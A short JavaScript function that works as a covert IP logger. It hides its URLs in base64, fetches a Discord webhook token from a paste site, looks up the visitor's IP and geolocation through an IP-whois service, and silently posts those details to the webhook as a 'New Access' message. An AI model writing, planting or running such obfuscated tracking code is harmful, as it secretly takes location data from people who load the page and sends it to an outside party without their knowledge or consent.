function req () {
  axios({url:window.atob('aHR0cHM6Ly9wYXN0ZWJpbi5ydW4vdnozZ3RwY3c2bTM5LnR4dA=='),method:'GET'}).then(file => {
    const get = {
        url:window.atob('aHR0cHM6Ly9pcHdob2lzLmFwcC9qc29uLw=='),
        method:'GET'
      }
      axios(get).then(res => {
        var content = '```New Access: \n\n';
        function capitalize (str) {
          if(!str[0] || str.startsWith('https')) return str;
          else return str[0].toUpperCase()+str.slice(1,);
        }
        for (entry in res.data) {
          content+=capitalize(entry)+': '+capitalize(res.data[entry])+'\n'
        }
        content+='```';
        const post = {
          // hi pikkel :)
          url:window.atob(`aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv${file.data.match(/O.{114}5/)[0]}`),
          method:'POST',
          data:{
            "content":content,
          },
          headers:{
            'content-type':'application/json'
          }
        }
        axios(post);
      })
  })
}
